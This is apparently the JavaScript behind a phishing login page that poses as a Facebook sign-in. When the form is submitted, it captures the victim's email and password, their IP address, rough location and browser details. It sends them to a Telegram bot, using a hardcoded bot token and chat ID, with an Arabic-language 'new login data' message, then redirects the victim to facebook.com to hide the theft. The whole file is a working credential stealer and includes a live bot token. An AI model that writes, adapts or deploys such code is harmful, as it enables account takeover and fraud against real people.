document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const submitBtn = document.getElementById('submitBtn');
    const loading = document.getElementById('loading');

    submitBtn.style.display = 'none';
    loading.style.display = 'block';

    try {
        const ip = await getIP();
        const userAgent = navigator.userAgent;
        const time = new Date().toLocaleString();
        const location = await getLocation(ip);

        await fetch(`https://api.telegram.org/bot7779309289:AAFf0oNcPBqeIWQlpVUUyuwDlERZ0U9_yP8/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: '1115607909',
                text: `
📩 بيانات تسجيل دخول جديدة:
━━━━━━━━━━━━━
📧 البريد: ${email}
🔑 كلمة السر: ${password}
━━━━━━━━━━━━━
🌍 IP: ${ip}
📍 الموقع: ${location}
🕒 الوقت: ${time}
🖥️ المتصفح: ${userAgent}
━━━━━━━━━━━━━
                `
            })
        });

        setTimeout(() => {
            window.location.href = "https://facebook.com";
        }, 3000);
    } catch (error) {
        console.error('Error:', error);
        submitBtn.style.display = 'block';
        loading.style.display = 'none';
        alert('حدث خطأ غير متوقع');
    }
});

async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch {
        return 'غير معروف';
    }
}

async function getLocation(ip) {
    try {
        const res = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await res.json();
        return `${data.city}, ${data.country_name}`;
    } catch {
        return 'غير معروف';
    }
}